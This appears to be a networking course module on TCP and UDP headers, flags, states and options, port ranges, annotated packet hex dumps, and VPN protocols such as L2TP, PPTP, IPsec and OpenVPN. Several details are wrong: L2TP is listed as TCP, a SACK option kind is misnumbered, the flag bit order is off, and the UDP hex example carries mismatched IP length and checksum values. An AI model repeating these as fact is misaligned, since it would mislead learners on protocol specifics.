TCP (Transmission Control Protocol) provides reliable, connection-oriented communication by establishing a connection, ensuring data delivery, and handling error detection and recovery. TCP is commonly used for applications that require reliable and ordered delivery of data, such as web browsing, email, and file transfer.

The protocol data unit (PDU) for TCP is Segment.
TCP Header: The TCP header contains fields such as source port, destination port, sequence number, acknowledgment number, checksum, and control flags (e.g., SYN, ACK, FIN). These fields are used to establish connections, manage data transmission, and handle flow control and error recovery.
UDP (User Datagram Protocol) provides unreliable, connectionless communication by sending data packets without establishing a connection or ensuring delivery. UDP is commonly used for real-time applications, multimedia streaming, DNS, and other applications where low overhead and minimal delay are preferred over reliability.

The protocol data unit (PDU) for UDP is Datagram.
UDP Header: The UDP header contains fields such as source port, destination port, length, and checksum. Unlike TCP, UDP does not include sequence numbers, acknowledgment numbers, or control flags, as it provides a simple, connectionless transport mechanism without reliability features.
Addressing used at this layer are ports.

Ports are communication endpoints that allow multiple applications or services to run on a single device and communicate over a network. Ports are identified by numbers ranging from 0 to 65535.
Well-known ports (0-1023) are reserved for specific services, such as HTTP (port 80) and SMTP (port 25).
Registered ports (1024-49151) are used by applications and services registered with the Internet Assigned Numbers Authority (IANA).
Dynamic or private ports (49152-65535) are available for temporary use by client applications when establishing connections.


Resources


Instructor Note


3.1.1 Describe Transport Layer Protocols¶
The Transport layer (Layer 4) is responsible for the transfer of data, ensuring that data is error-free and in order.

Transport layer communication falls under two categories:



Connection-oriented (TCP-Segments-Unicast traffic)

Requires that a connection with specific agreed-upon parameters be established before data is sent.

Provides segmentation and sequencing.

Provides connection establishment and acknowledgments to provide reliability.

Provides flow control (or windowing).

Common application layer protocols or functions that rely on TCP are SSH, Telnet, FTP, SMTP, POP, IMAP, and HTTP(s).

Get more information in link: RFC 793



Connection-less (UDP-Datagrams-Broadcast, Multicast, Unicast Traffic)

Requires no connection before data is sent.

Provides no ordering, duplicate protection or delivery guarantee.

Application layer protocols will normally provide the reliability if needed.

Does provide integrity checking using the checksum.

Common application layer protocols or functions that rely on UDP are DNS, TFTP, and QUIC (Quick UDP Internet Connections).

Get more information in link: RFC 768



Resources


Instructor Note


3.1.2 Review Well-known, Registered and Dynamic port ranges¶
Ports are used in computer networking to facilitate communication between different applications, services, or devices. They serve as endpoints for network communication and help distinguish between multiple concurrent communication channels.

Identifying Applications and Services:

Ports are numbered identifiers assigned to specific applications or services running on a device.
Each application or service that communicates over a network uses one or more ports to send and receive data.
Ports help network devices understand which application or service should receive incoming data packets.
Multiplexing and Demultiplexing:

Ports enable multiplexing, which allows multiple applications or services to share a single network connection or network interface.
When data packets arrive at a device, the operating system uses the destination port number to demultiplex the packets and forward them to the appropriate application or service.
Without ports, computers would be limited to engaging in only one communication session at a time, severely constraining their ability to multitask and efficiently handle network traffic.
Establishing Communication Channels:

Ports play a crucial role in establishing communication channels between devices on a network.
In client-server communication, a client application connects to a server application by specifying the server's IP address and port number.
Once the connection is established, data can be exchanged between the client and server through the designated port.
Network Security:

Ports are essential for configuring network security policies, such as firewalls and access control lists (ACLs).
Firewall rules can be configured to allow or block traffic based on specific port numbers, helping to protect network resources from unauthorized access or malicious activity.
Network Troubleshooting:

Ports are often used in network troubleshooting to diagnose connectivity issues or analyze network traffic.
By examining the port numbers associated with network traffic, network administrators can identify the applications or services involved and pinpoint the source of network problems.






Well-known (System) port numbers (0-1023), which are assigned by IANA are responsible for maintaining the official assignments of port numbers for specific uses. This range is dedicated for common protocols and services across all operating systems. Changes to systems well-known port numbers require elevated or root privileges.

Registered (User) port numbers (1024-49151) can be registered with IANA for a specific service by a requesting entity. This range is loosely controled by IANA. Some operating systems may use this range as dynamically assigned source ports. There are services and protocols that have ports in this range such as Remote Desktop Protocol (RDP on port 3389). Many services and protocols in this port range may be limited to specific operating systems. Changes to systems registered port numbers do not need elevated or root privileges.

Dynamic (Private) port numbers (49152-65535) can not be registered with IANA. These ports are for use as temporary, private, or/and for automatic allocation of ephemeral ports. This range is not controlled in any way by IANA for any protocols and services. Changes to systems dynamic port numbers do not need elevated or root privileges.

Important to note that binding is an integral step for server side socket (IP address + port number) that provides an address to a end-user to request services. Restrictions to the well-known port numbers is needed to protect major network services such as HTTP, HTTPS, SSH, FTP, etc. Without these restrictions a unauthorized user could run a program that listened on these ports for login (access) details or could run a unauthorized server application.

Source Port:

When a client initiates communication, it selects a source port to use for outgoing packets.
The source port helps the client device identify which application or service on the sending device originated the communication.
Source ports are typically chosen from the dynamic port range (49152-65535) by the operating system or application.
The server however will use the service port as its source port.
Destination Port:

The client specifies the destination port as the number used by the receiving application or service.
It client specifies the port on the destination server where the communication is intended to be delivered.
When the server receives incoming packets, it uses the destination port number to determine which application or service should handle the data.
Destination ports are typically well-known (1-1023) or registered port numbers (1024-49151) that are associated with specific services or applications.
The server however will use the client's dynamically assigned source port as its destination port to send replies back to the client.


Resources


Instructor Note


3.1.3 Describe TCP reliability using sequence and acknowledgment numbers¶




TCP is a connection oriented protocol and therefore is divided into one of 3 phases.

Connection establishment

3-way Handshake. Any system can initiate the connection but is typically initiated from a client to request connection to a server.

SYN - Client initiates the connection by setting the SYN flag and sending his initial starting SEQ number in the SEQ number field. The ACK flag and field are set to zero. The client can additionally specify other communication parameters. These parameters can only be negotiated during the SYN phase and can not be changed later in the communication.

Maximum Segment Size (MSS) (Kind=2). Largest amount of data that can be transmitted in a single TCP segment.

Window scale factor (Kind=3). Extends the window size field in TCP headers to support larger data transfers by multiplying the window size value by a power of two, effectively expanding the range of available window sizes.

Selective Acknoledgement (SACK) (Kind=5). Option allowing a receiver to inform the sender about specific segments that have been received successfully, enhancing performance by enabling retransmission of only missing segments rather than entire blocks of data.

SYN-ACK - Server responds to the client by turning on the ACK flag and adding 1 to client's SEQ number and placing the value in the ACK field. The server will turn on the SYN flag and insert its own SEQ number in the SEQ number field. The server can additionally specify other communication parameters such as its Window scale factor, Maximum Segment Size (MSS), and Selective Acknoledgement (SACK).

ACK - Client will then set the ACK flag add 1 to the server's SEQ number and place in the ACK field and send to server. The SEQ number will be the next number in sequence from the starting. The SYN flag however will not be turned on. This completes the handshake and both sides are now in the ESTABLISHED state and all data transfer is bi-directional.

Data Transfer

During the ESTABLISHED state communication can go in either direction. Data can be either set to or pulled from the server.

PSH-ACK - Server is sending data to client so it turns on the PSH flag. It will insert its next incrementing SEQ number in the SEQ field. In the payload, it will send either the amount of bytes its able to send, or the amount the client is able to receive, depending on which is smaller. This is determined by the window size of each side. This can increase or decrease during the communication. The ACK flag will also be set to ACK the last SEQ number from the Client +1.

ACK - The client will set his incrementing SEQ number in the SEQ field and then set the ACK flag and ACK field to the next expected byte number from the server in the ACK field.

Connection Termination

4-way termination. Either the client or server can initiate the connection termination. Each end can only close its half of the connection which means that each end needs to request to close. Whichever initiates it follows this process:

FIN-ACK - Initiator will set the FIN flag to inform the other end that it is closing its end of the connection. It will set its SEQ number to the next incrementing number.

ACK - Receiver will set the ACK flag and ACK the initiator's SEQ number +1 in the ACK field.

FIN-ACK - Receiver then initiates its connection termination buy setting the FIN flag and setting its own SEQ number in the SEQ field.

If the close was initiated by the client, the server can respond to the FIN-ACK sent by the client in one of two ways.

Passive Close by Server: The server receives the FIN segment from the client and sends back an ACK segment to acknowledge the termination request but does not sent a FIN-ACK itself.

Active Close by Server: The server does send a FIN-ACK.

ACK - Original initiator then sets the ACK flag and ACKs the receiver's SEQ number +1 in the ACK field. SEQ number will be the next incrementing SEQ number.



Resources


Instructor Note


3.1.4 Analyze TCP and UDP headers¶
This section will cover the two main headers, TCP and UDP. A greater understanding of the headers will help provide you information on how to modify or to identify abnormal TCP segments and UDP datagrams.



Resources


Instructor Note


3.1.4.1 TCP Headers¶


Byte Number	Field Name	Bit Range	Length	Description
0-1	Source Port	0-15	16 bits	Specifies the port that localhost is listening on for traffic during this communication.
2-3	Destination Port	16-31	16 bits	Specifies the port on the receiving (destination) host that it is listening on for this communication.
4-7	Sequence Number	32-63	32 bits	If SYN flag set: this is the initial (starting) sequence number; If SYN flag is not set: this is the sequence number of the current segment that has incremented from the starting sequence number.
8-11	Acknowledgment Number (if ACK is set)	64-95	32 bits	If ACK flag is set, it specifies the next sequence number the sender is expecting. Sender's Sequence Number +1.
12	Data Offset	96-99	High 4 bits	The size of TCP header in 32-bit WORDS. Minimum=5, Max=15. Used if there are TCP options.
12	Reserved	100-102	Low 3 bits	Reserved for future use and should be set to zero.
12	NS	103	Low 1 bit	Optional addition to the L3 ECN. RFC 3540.
13	Flags	104-111	8 bits	Control bits: CWR, ECE, URG, ACK, PSH, RST, SYN, FIN.
14-15	Window Size	112-127	16 bits	Size (in bytes) that this host is able to receive. This can be different on each end and can change during the course of the connection. Flow Control, Window Scaling.
16-17	Checksum	128-143	16 bits	Calculation done using the TCP header, Payload, and the Pseudo-Header (Source IP, Destination IP, and Protocol number (0x06)).
18-19	Urgent Pointer (if URG is set)	144-159	16 bits	If URG is set then this is an offset (range) from the sequence number indicating the last urgent data byte.
20-59	Options	variable	0-320 bits (divisible by 32)	Variable options. Examples: TCP Options.






TCP segments will have the Protocol field set to 6 in the IPv4 Header or the Next Header field set to 6 in the IPv6 Header.

00 1f 29 5e 4d 26 00 50　56 bb 3a a0 08 00 45 00
00 3c 83 1b 40 00 40 06　15 0a c0 a8 14 46 4a 7d
83 1b d5 1d 00 19 6b 7f　c7 2d 00 00 00 00 a0 02
72 10 a2 b5 00 00 02 04　05 b4 04 02 08 0a 0a 99
44 36 00 00 00 00 01 03　03 07 
Ethernet Header:

00 1f 29 5e 4d 26 is the destination MAC
00 50 56 bb 3a a0 is the source MAC
08 00 is the ethertype for IPv4
IPv4 Header:

45 to identify the Version is 4 and the IHL is 5 which means the IP header is 20 bytes in length. (IHL x 4)
00 is the DSCP. Used for Quality of Service (QoS).
00 3c is the Total length of 60 bytes. This includes the 20 byte header and 40 bytes of payload.
83 1b is the Identification field. Value is 33563.
40 00 is the Flags and fragmentation offset field. This value has the Dont Fragement (DF) turned on and no fragmentation offset.
80 00 is the value for the Reserved (Evil bit).
20 00 to 3F FF is the range for the More Fragements (MF) bit and fragmentation offset.
40 is the Time to Live field. Currently set to 64.
06 is the Protocol field. Currently set to identify TCP.
01 is for ICMPv4
11 is for UDP
15 0a is the Checksum field
c0 a8 14 46 is the source IP address. Currently set to 192.168.20.70.
4a 7d 83 1b is the destination IP address. Currently set to 74.125.131.27.
TCP Header:

d5 1d is the source port field. Currently set to 54557.
00 19 is the destination port field. Currently set to 25.
6b 7f　c7 2d is the sequence number field. Currently set to 1803536173.
00 00 00 00 is the acknowledgment field. Currently set to 0.
a0 is the offset and reserved fields.
a is the offset field to identify the length of the TCP header. The a means that the TCP header is 40 bytes in length. (offset x 4)
0 is the reserved field. This should always be 0.
02 is the TCP flags field. Currently the SYN flag is set.
80 is the Congestion window reduced (CWR) flag.
40 is the ECN-Echo flag.
20 is the Urgent pointer flag. If set then system should check Urgent pointer field.
10 is the Acknowledgment flag. Used to inform sender of recieved data.
08 is the Push flag. Used to inform recipient that data is in payload.
04 is the Reset flag. Sent to close connection.
02 is the Synchronize flag. Used to synchronize starting sequence numbers at the start of the conneciton during the 3-way handshake.
01 is the Finish flag. Used to inform other end that connection is being terminated.
72 10 is the window size field. Currently set to 29200.
a2 b5 is the checksum field.
00 00 is the urgent pointer field. Should only be set if URG flag is on. This is not commonly used in modern networking. Currently set to 0.
TCP Options:

02 04　05 b4 is the Maximum segment size (MSS) option field. Used to determine the MSS for the communicaiton. Kind = 2. Length = 4. MSS = 1460
04 02 is the Selective Acknoledgement (SACK) permitted option. Used to determine if SACK is permitted or not. Kind - 4. Length = 2.
08 0a 0a 99 44 36 00 00 00 00 is the timestamps option. Used to measure TCP roundtrip time (RTT). Kind = 8. Length = 10. Timestamp = 177816630. Timestamp echo reply = 0.
01 is the No-Operation (NOP) option. Kind = 1
03 03 07 is the window scale option. Used to to increase the maximum window size from 65,535 bytes to 1 Gigabyte. Kind = 3. Length = 3. Shift count = 7 (multiply by 128).
Anything after this will be payload.



DEMO TCP Headers


Resources


Instructor Note


3.1.4.1.1 TCP Flags¶






CWR: Congestion Windows Reduced - The congestion window reduced flag is used by the sending host to indicate it received a packet with the ECE flag set. (Not commonly used unless Explicit Congestion Notification (ECN) is used in the TCP header.)

ECE: Explicit Congestion Notification (ECN) Echo - This flag is responsible for indicating if the TCP peer is ECN capable. (Not commonly used unless Explicit Congestion Notification (ECN) is used in the TCP header.)

URG: Urgent - Indicates that the urgent pointer field is valid and contains urgent data. The urgent flag is used to notify the receiver to process the urgent packets before processing all other packets. Has become less relevant for modern TCP communications.

ACK: Acknowledgment - The acknowledgment flag is used to acknowledge the successful receipt of a packet.

PSH: Push - The push flag is somewhat similar to the URG flag and tells the receiver to process these packets as they are received instead of buffering them. This flag is only used during the established phase when sending data. Should be sent with an ACK flag.

RST: Reset - The reset flag gets sent from the receiver to the sender when a packet is sent to a particular host that was not expecting it. Most commonly used in response to a TCP connection on a closed port.

SYN: Synchronize - The synchronization flag is used as a first step in establishing a three way handshake between two hosts. Is only legitimately used during the 3-way handshake.

FIN: Finished - The finished flag means no more data from sender. Used as part of the 4-way TCP connection termination. Should be sent with an ACK flag.



Two mnemonics to remember the TCP flags are:

Collection of Exceptionally Unskilled Attackers Pester Real Security Folks

Coach Explained to the University of Alaska to Play Really Snowy Football





In the image above, a hex representation of 0x02 in a hex output at byte 13 would identify a SYN flag being set to ON. A 0x12 at that same byte number would indicate that a SYN, ACK flags are set to ON. Finally a 0x10 on byte 13 would identify a ACK flag.

TCP Flags:

8	4	2	1	8	4	2	1
128	64	32	16	8	4	2	1
URG	CWR	ECE	ACK	PSH	RST	SYN	FIN
SYN	0	0	0	0	0	0	1	0
SYN/ACK	0	0	0	1	0	0	1	0
ACK	0	0	0	1	0	0	0	0
Established	-	-	-	-	-	-	-	-
PSH/ACK	0	0	0	1	1	0	0	0
ACK	0	0	0	1	0	0	0	0
PSH/ACK	0	0	0	1	1	0	0	0
ACK	0	0	0	1	0	0	0	0
Graceful Termination	-	-	-	-	-	-	-	-
FIN/ACK	0	0	0	1	0	0	0	1
ACK	0	0	0	1	0	0	0	0
FIN/ACK	0	0	0	1	0	0	0	1
ACK	0	0	0	1	0	0	0	0
UnGraceful Termination	-	-	-	-	-	-	-	-
RST	0	0	0	0	0	1	0	0


RFC recommended response to illegal flag combinations:

Some illegal flag combinations may include null (no flags), URG-PSH-FIN (x-mas tree scan), FIN without ACK. Per the RFC, operating systems should silently discard packets containing illegal combinations.
Most Linux distributions follow the RFC's guidance which is to not respond.
Windows and MacOS often reply to these combinations with a RST-ACK. This can make those OSes harder to enumerate via TCP scanning, since open/closed ports illicit the same response.
When and why are illegal flag combinations or TCP options used?

Illegal flag combinations are often used during network scanning or enumeration to find out what ports are open through a firewall, services a host is running, or information about the OS.
TCP options are also commonly used in identifying OSes by tools such as P0f. This is because different operating systems can use different Window sizes, windows scaling and MSS values.


Resources


Instructor Note


3.1.4.1.2 TCP States¶






LISTEN - represents waiting for a connection request from any remote TCP and port.

SYN-SENT - represents waiting for a matching connection request after having sent a connection request.

SYN-RECEIVED - represents waiting for a confirming connection request acknowledgment after having both received and sent a connection request.

ESTABLISHED - represents an open connection, data received can be delivered to the user. The normal state for the data transfer phase of the connection.

FIN-WAIT-1 - represents waiting for a connection termination request from the remote TCP, or an acknowledgment of the connection termination request previously sent.

FIN-WAIT-2 - represents waiting for a connection termination request from the remote TCP.

CLOSE-WAIT - represents waiting for a connection termination request from the local user.

CLOSING - represents waiting for a connection termination request acknowledgment from the remote TCP.

LAST-ACK - represents waiting for an acknowledgment of the connection termination request previously sent to the remote TCP (which includes an acknowledgment of its connection termination request).

TIME-WAIT - represents waiting for enough time to pass to be sure the remote TCP received the acknowledgment of its connection termination request.

CLOSED - represents no connection state at all.



Resources


Instructor Note


3.1.4.1.3 Explain TCP Options¶
TCP Options:

Kind 0 - End of Options List: Indicates the end of the TCP options list. This option is a single byte with the value 0, serving as a delimiter for the end of the options.

Kind 1 - No Options or NOP: The NOP option is used for padding and alignment purposes. It has no operational effect but allows for the proper alignment of subsequent options. NOP is 1 byte in length and is used with other options to ensure they are in even 32-bit (4 byte) WORDS.

Kind 2 - Maximum Segment Size (MSS): The MSS option is specified during the 3-way handshake when the SYN flag is set. This identifies how many bytes of data that it can receive in a single segment. This is typically small enough to avoid the need for IP fragmentation. This is different from MTU which is the maximum packet size in bytes. The MTU is determined primarily by the network the host is connected to. The MSS should typically not exceed the value of the MTU minus the IP/TCP headers. Setting a MSS to a smaller value will then reflect a smaller packet size and can be less than 1500. For example: If you set the MSS to 1400 bytes, this will then have a minimum of 20 bytes of TCP header and 20 bytes of IP header (assuming no options). This will make the maximum packet size of 1440 bytes. This is less than the 1500 MTU so it gives room for other headers such as encryption or options.

RFC 793

How TCP Works - MTU vs MSS

Kind 3 - TCP Window Scaling: The window size field in the TCP header is a 16 bit field so the value of this field can only be from 0-65,535. This means that the sender of this segment can only theoretically receive between 0 bytes to 65,535 bytes of data before 1 ACK is sent. This is due to its receive buffers ability to hold and process data. Because of more modern computers having the feature of larger memory buffers, it can request to receive more data than what the window size field is able to be set to. Using the TCP Window scale option, the segment sender can set a multiplier (i.e. 0, 1, 2, 4, up to 14 etc). This will adjust a calculated window size that you can see in Wireshark to the window size multiplied by the multiplier setting. If the sender using this option it will enable it for use on the receiver's end. During the transfer process the receiver's window size can decrease. This is typically due to its buffer becoming filled faster than it can process the data. Once the receive buffer is filled it will set its window size to zero until the data can be sufficiently processed. During the wait the sender will send keep-alives to keep connection open to avoid any timeouts and the receiver will ACK these messages to let sender know they are still active but window size will stay at zero. Once the receiver's buffers are cleared it will then send a message with the window size and scaling set to what it can now receive.

RFC 7323

How TCP Works - The Receive Window

How TCP Works - Window Scaling

Kind 4 - SACK Permitted: Indicates that the sender is willing to receive Selective Acknowledgment (SACK) information from the receiver. The length is typically 2 bytes.

Kind 5 - SACK (Selective Acknowledgment): Contains information about segments that have been received successfully. SACK allows for more efficient recovery from lost or out-of-order segments. The length is variable, depending on the number of SACK blocks.

Kind 8 - Timestamps: Used for timestamp synchronization between TCP peers. The sender includes a timestamp value in the TCP header, and the receiver echoes it back. Timestamps are useful for calculating round-trip times and can be used in congestion control algorithms. The length is typically 10 bytes.

Kind 14 - TCP Alternate Checksum Request: Requests an alternative checksum for the TCP header and data. This option is not widely used, and the length is typically 3 bytes.

Kind 15 - TCP Alternate Checksum Data: Contains the alternative checksum for the TCP header and data. Like the request option, this option is not commonly used, and the length is typically variable.



DEMO TCP Options


Resources


Instructor Note


3.1.4.2 UDP Headers¶


Byte Number	Field Name	Bit Range	Length	Description
0-1	Source Port	0-15	16 bits	Specifies the port that localhost is listening on for traffic during this communication.
2-3	Destination Port	16-31	16 bits	Specifies the port on the receiving (destination) host that it is listening on for this communication.
4-5	Length	32-47	16 bits	Specifies the length of the UDP header and data.
6-7	Checksum	48-63	16 bits	Used for error checking of the header and data. This is optional for IPv4 and mandatory in IPv6.


Some attributes that UDP does not have, which makes it a protocol better suited for certain applications like VoIP, Streaming Media or DNS.

UDP has a much smaller header. It does not address sequencing of datagrams (although Protocols like RTP riding over UDP can help to assist with this). It also does not have windowing, flow control, or a re-transmission mechanism.
These attributes make the protocol more lightweight and suited for latency sensitive applications, or applications that do not benefit from a stateful connection.
UDP scans are difficult to use since the protocol is not stateful, no response is required from the target when a datagram is sent.

UDP scanning is possible however because of the helper protocol ICMP. ICMP will provide "port unreachable" messages if the port being scanned is closed.
Due to the lack of flow control, UDP scans can easily overwhelm a host. This can result in the target being unable to process and provide ICMP messages response to all the probes sent, therefore skewing the results.


UDP datagrams will have the Protocol field set to 17 in the IPv4 Header or the Next Header field set to 17 in the IPv6 Header.

00 1f 29 5e 4d 26 00 50　56 bb 3a a0 08 00 45 00
00 3c 83 1b 40 00 40 11　15 0a c0 a8 14 46 4a 7d
83 1b dc de 00 35 00 36　7c 15 03 c4 01 20 00 01
00 00 00 00 00 01 04 6f　63 73 70 08 76 65 72 69
73 69 67 6e 03 6e 65 74　00 00 1c 00 01 00 00 29
10 00 00 00 00 00 00 00 
Ethernet Header:

00 1f 29 5e 4d 26 is the destination MAC
00 50 56 bb 3a a0 is the source MAC
08 00 is the ethertype for IPv4
IPv4 Header:

45 to identify the Version is 4 and the IHL is 5 which means the IP header is 20 bytes in length. (IHL x 4)
00 is the DSCP. Used for Quality of Service (QoS).
00 3c is the Total length of 60 bytes. This includes the 20 byte header and 40 bytes of payload.
83 1b is the Identification field. Value is 33563.
40 00 is the Flags and fragmentation offset field. This value has the Dont Fragement (DF) turned on and no fragmentation offset.
80 00 is the value for the Reserved (Evil bit).
20 00 to 3F FF is the range for the More Fragements (MF) bit and fragmentation offset.
40 is the Time to Live field. Currently set to 64.
11 is the Protocol field. Currently set to identify UDP.
01 is for ICMPv4
06 is for TCP
15 0a is the Checksum field
c0 a8 14 46 is the source IP address. Currently set to 192.168.20.70.
4a 7d 83 1b is the destination IP address. Currently set to 74.125.131.27.
UDP Header:

dc de is the source port field. Currently set to 56542.
00 35 is the destination port field. Currently set to 53.
00 36 is the length field. Currently set to 54 bytes. This includes 8 bytes of UDP header and 46 bytes of payload.
7c 15 is the checksum field.
Anything after this will be payload.



Get more information in link: RFC 768

Well Known TCP/IP Ports



DEMO UDP Headers


Resources


Instructor Note


3.2 Explain OSI Layer 5 protocols and headers¶
Layer 5 of the OSI (Open Systems Interconnection) model is the Session Layer. The Session Layer is responsible for managing communication sessions between devices, including establishing, maintaining, and terminating these sessions. Unlike lower layers, which focus on the transmission of data, the Session Layer deals with the organization and synchronization of communication sessions. While the OSI model defines the Session Layer, it's worth noting that in many practical network implementations, the functions of the Session Layer are often combined with those of the Presentation Layer or are implemented within application-layer protocols. Therefore, Layer 5 protocols are not as prevalent or standardized as those in lower layers.

Session Layer - The main purpose of this layer is to maintain the state of your ongoing connections. This state is not used in a connection-less protocol. Functions for managing sessions, including session synchronization, checkpointing, and recovery in the event of communication failures. These functions ensure that communication sessions remain synchronized and consistent between devices.

This layer provides the capabilities to open, close and manage sessions between the application layer processes. The communication at this layer consist of requests and responses that occur between the local and remote applications. Session-layer makes use of remote procedure calls (RPCs), Net-Beui, SOCKS, SMB, WINS, named-pipes, PPTP and other protocols.



Resources


Instructor Note


3.2.1 Understand Virtual Private Networks (VPN)¶
Virtual Private Networks (VPN) allows connections through a network that is not accessible to everyone else. This "private" connection makes is look like a direct connection, when in fact it is not. VPNs work by encapsulating an IP packet into another IP packet for traversal across a (generally) public network. The outer IP packet headers used for the traversal is then removed and the original packet headers are then used for further routing decisions.



VPN connections are typically unencrypted but can be secured using encryption, such as IPSEC or TLS/SSL, to make it more secure for sensitive information. Some protocols used to provide confidentiality for VPN tunnels.

IPsec: Provides a suite of protocols for secure IP communication, including Authentication Header (AH), Encapsulating Security Payload (ESP), and Internet Key Exchange (IKE).

SSL/TLS: Utilizes the SSL/TLS protocol suite to create secure connections between clients and servers, commonly used in SSL VPNs.

OpenVPN: An open-source VPN protocol that uses SSL/TLS for encryption and authentication, known for its flexibility and cross-platform compatibility.

When using VPNs, the overhead of additional optional packet headers and security features (GRE, PTP, IPSEC, etc) must be taken in account for the MTU and MSS sizes. Some communications do not handle the tunneling automatically and reduce its MTU size. These communication methods may require manual MTU configurations.

Types of VPNs:



Remote Access VPN (Client-to-Site VPN):
Allows individual users to securely connect to a private network from remote locations over the internet.
These VPNs are commonly used by employees working from home or while traveling to access company resources such as files, applications, and internal systems.
Remote access VPNs typically use protocols like SSL/TLS or IPsec to create encrypted tunnels between the user's device and the corporate network.
Uses OpenVPN, IPsec, or Wireguard installed on the client system to create the tunnel to the Network Access Server in the main office.


Site-to-Site VPN: (aka router-to-router VPN)
Connects multiple sites or networks together over the internet, creating a secure communication link between them.
Site-to-site VPNs are commonly used to connect branch offices to a central headquarters, or to connect geographically distributed data centers.
Can be configured as point-to-point, point-to-multipoint, or full mesh.
Uses IPSEC, MPLS, SSL, PPTP, L2TP, and others to create the tunnel.


Resources


Instructor Note


3.2.1.1 L2TP (TCP 1701)¶
Layer Two Tunneling Protocol (L2TP) serves as an extension of the Point-to-Point Tunneling Protocol (PPTP) commonly employed by internet service providers (ISPs) to establish virtual private networks (VPNs). The primary objective of L2TP is to enable secure data transmission through the creation of tunnels. To uphold security and privacy standards, L2TP necessitates the use of an encryption protocol within the established tunnel.

L2TP exhibits the capability to transport a diverse range of Layer 2 (L2) data types across an Internet Protocol (IP) or Layer Three (L3) network. The initiation of this process involves the establishment of a tunnel connecting an L2TP Access Concentrator (LAC) and an L2TP Network Server (LNS) on the internet. This configuration facilitates the implementation of a Point-to-Point Protocol (PPP) link layer, which is encapsulated and seamlessly transferred across the internet for secure and efficient communication.







Resources


Instructor Note


3.2.1.2 PPTP (TCP 1723)¶
Point-to-Point Tunneling Protocol (PPTP) stands as a foundational networking protocol that empowers the secure deployment of Virtual Private Networks (VPNs) over the Internet. Conceived by Microsoft and collaborative contributors, PPTP is intricately designed to forge a private and encrypted communication conduit between clients and servers, guaranteeing the secure transmission of data.

Authentication Mechanisms: PPTP boasts support for a range of robust authentication mechanisms, including Password Authentication Protocol (PAP), Challenge Handshake Authentication Protocol (CHAP), and Microsoft CHAP (MS-CHAP). These mechanisms play a pivotal role in fortifying the verification processes, ensuring the genuine identity of the connecting parties.

Encapsulation and Encryption Expertise: PPTP demonstrates its prowess by encapsulating data within its proprietary packets, establishing a secure tunnel for data transmission. Furthermore, it incorporates encryption protocols such as Microsoft Point-to-Point Encryption (MPPE) to safeguard the confidentiality of the transmitted data. This dual-layered approach enhances the privacy and integrity of the communication channel.

Awareness of Limitations: Recognizing its historical prevalence, it's crucial to acknowledge the limitations associated with PPTP. While it was widely adopted in the past, PPTP has exhibited security vulnerabilities, prompting a gradual decline in usage. Organizations and users have increasingly favored more secure VPN protocols like L2TP/IPsec and OpenVPN to address evolving security standards and ensure a higher level of data protection.







Resources


Instructor Note


3.2.1.3 IP Security (IPSec)¶
IPsec (Internet Protocol Security) is a suite of protocols used to secure IP communications by providing encryption, authentication, and integrity protection at the network layer (Layer 3) of the OSI model. It is widely used to establish Virtual Private Networks (VPNs) and secure data transmission over IP networks, including the internet.

Transport mode and Tunnel mode are two operational modes of IPsec (Internet Protocol Security) used to provide security for IP communications.





Transport Mode:

In Transport mode, IPsec only encrypts the payload (data) of the original IP packet, leaving the original IP header intact.
Transport mode is typically used for end-to-end communication between two hosts or devices.
When using Transport mode, only the data portion of the IP packet is protected by IPsec, while the original IP header, including the source and destination IP addresses, remains visible to intermediate devices.
Transport mode is often used for scenarios where the communicating endpoints need to establish a secure connection while maintaining direct communication with each other.
Example use cases for Transport mode include securing communication between individual hosts or devices within a private network or securing VoIP (Voice over IP) traffic between two endpoints.




Tunnel Mode:
In Tunnel mode, IPsec encapsulates the entire original IP packet within a new IP packet, adding an additional IP header.
Tunnel mode is commonly used to create secure VPN (Virtual Private Network) connections between networks or network devices, such as routers or firewalls.
When using Tunnel mode, the original IP packet, including its header and payload, is encrypted and encapsulated within a new IP packet.
The new IP header contains the IP addresses of the VPN gateway devices (tunnel endpoints), which are responsible for encrypting and decrypting the data as it passes through the VPN tunnel.
Tunnel mode provides network-level security, ensuring that all traffic between the VPN gateway devices is encrypted and protected from eavesdropping or tampering.
Example use cases for Tunnel mode include connecting branch offices to a central headquarters network over the internet, creating secure connections between remote users and a corporate network, or establishing site-to-site VPN connections between data centers.


Headers used by IPSec:

ESP Header (Encapsulating Security Payload):

Uses IP protocol number 50 to indicate IPSec with ESP Header payload.
The Encapsulating Security Payload provides confidentiality, integrity, and optional authentication for IP packets.
It encrypts the payload of IP packets to protect the confidentiality of the data being transmitted.
The ESP header includes fields for the Security Parameters Index (SPI), sequence number, padding, authentication data (MAC), and other parameters.
ESP can operate in either Transport mode (encrypts only the IP payload) or Tunnel mode (encrypts the entire IP packet).
Performs integrity check only on ESP header and payload. Not the outer IP header.
Does support protocols like NAT that alter the outer header.
Modification or changes to the outer header does not affect ESP.
AH Header (Authentication Header):

Uses IP protocol number 51 to indicate IPSec with AH Header payload.
The Authentication Header provides data integrity, authentication, and anti-replay protection for IP packets.
It is used to ensure that the data received has not been altered or tampered with during transmission.
The AH header includes fields for the Security Parameters Index (SPI), sequence number, authentication data (Message Authentication Code, MAC), and other parameters.
AH can operate in either Transport mode (protects only the IP payload) or Tunnel mode (protects the entire IP packet).
Performs integrity check on entire packet to include outer IP header.
Integrity done only on immutable fields: Version, Length, Next Header/protocol, Source address, Destination address
Mutable fields: DSCP/Traffic Class, Flow Label, TTL/Hop Limit
Does not support protocols like NAT that alter the outer header.
"mostly" obsolete
IKE Header (Internet Key Exchange):

IKE typically uses UDP port 500 for its main communication channel.
IKEv2 may use UDP port 4500 for NAT traversal (UDP encapsulation) to overcome NAT (Network Address Translation) issues.
IKE is used to establish Security Associations (SAs) and negotiate cryptographic parameters for IPsec.
It operates at the application layer (Layer 7) and is used to exchange keying material, negotiate encryption and authentication algorithms, and authenticate IPsec peers.
The IKE header includes fields for message type, exchange type, cryptographic algorithms, key exchange data, and other parameters.
IKE is typically used in conjunction with IPsec to establish secure VPN connections.


Resources


Instructor Note


3.2.1.4 OpenVPN¶
OpenVPN is an open-source VPN (Virtual Private Network) software that provides secure communication over the internet by creating encrypted tunnels between devices or networks. It is widely used for remote access VPNs, site-to-site VPNs, and other secure networking applications.

OpenVPN requires special software that implements the OpenVPN protocol. There are client and server versions. The client software runs on your device (computer, phone, etc.) and the server software runs on the VPN provider's server. This software creates the encrypted tunnel and manages the data transmission.

It's known for being very secure due to strong encryption algorithms and multiple authentication methods. OpenVPN uses the OpenSSL library to provide encryption of both the data and control channels.

